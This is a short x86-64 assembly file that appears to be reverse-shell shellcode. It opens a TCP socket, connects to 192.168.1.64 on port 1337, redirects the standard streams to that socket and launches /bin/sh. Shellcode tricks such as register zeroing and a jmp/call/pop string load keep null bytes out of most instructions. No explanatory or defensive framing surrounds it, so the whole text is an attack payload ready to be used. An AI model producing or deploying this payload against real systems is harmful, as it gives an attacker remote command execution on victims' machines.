bits 64
section .text
global _start

_start:
	
	; socket(AF_INET, SOCK_STREAM, 0)
	; (2, 1, 0)

	xor rax, rax
	mov rdx, rax
	mov al, 41
	mov rsi, rdx
	inc rsi
	mov rdi, rsi
	inc rdi

	syscall


	; connect(sockfd, &saddr, 0x10)
	
	mov rdi, rax
	mov al, 42
	push rdx
	push rdx
	mov byte [rsp], 0x2
	mov word [rsp + 2], 0x3905 ; 1337
	mov dword [rsp + 4], 0x4001a8c0 ; 192.168.1.64
	mov rsi, rsp
	mov dl, 0x10

	syscall

	; dup2(clientfd, [0,1,2])
	
	xor rsi, rsi
	duplicate:
		mov al, 33
		syscall
		inc sil
		cmp sil, 0x2
		jle duplicate

	; execve("/bin/sh", NULL, NULL)
	
	jmp binsh

	shell:
	mov al, 0x3b
	xor rsi, rsi
	xor rdx, rdx
	pop rdi

	syscall

	binsh:
		call shell
		db "/bin/sh"
